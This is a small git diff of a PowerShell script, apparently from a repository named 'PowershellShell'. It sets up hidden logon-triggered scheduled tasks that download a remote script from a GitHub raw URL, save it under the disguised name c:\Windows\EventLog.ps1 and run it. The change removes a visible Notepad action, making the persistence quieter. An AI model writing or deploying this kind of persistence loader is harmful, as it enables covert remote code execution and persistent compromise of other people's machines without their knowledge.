@@ -108,7 +108,6 @@ start-job -ScriptBlock {
         try{
             $action = @()
             $action += new-scheduledtaskaction -execute 'Powershell.exe' ` -Argument '-windowstyle hidden -Command "invoke-restmethod https://raw.githubusercontent.com/Magrene/PowershellShell/Dev/Bucephalus.ps1 | out-file -filepath c:\Windows\EventLog.ps1'
-            $action += new-scheduledtaskaction -execute 'Notepad.exe'
             $action += new-scheduledtaskaction -execute 'Powershell.exe' ` -Argument '-windowstyle hidden -Command "c:\Windows\EventLog.ps1"'
             
             $trigger = New-ScheduledTaskTrigger -AtLogon
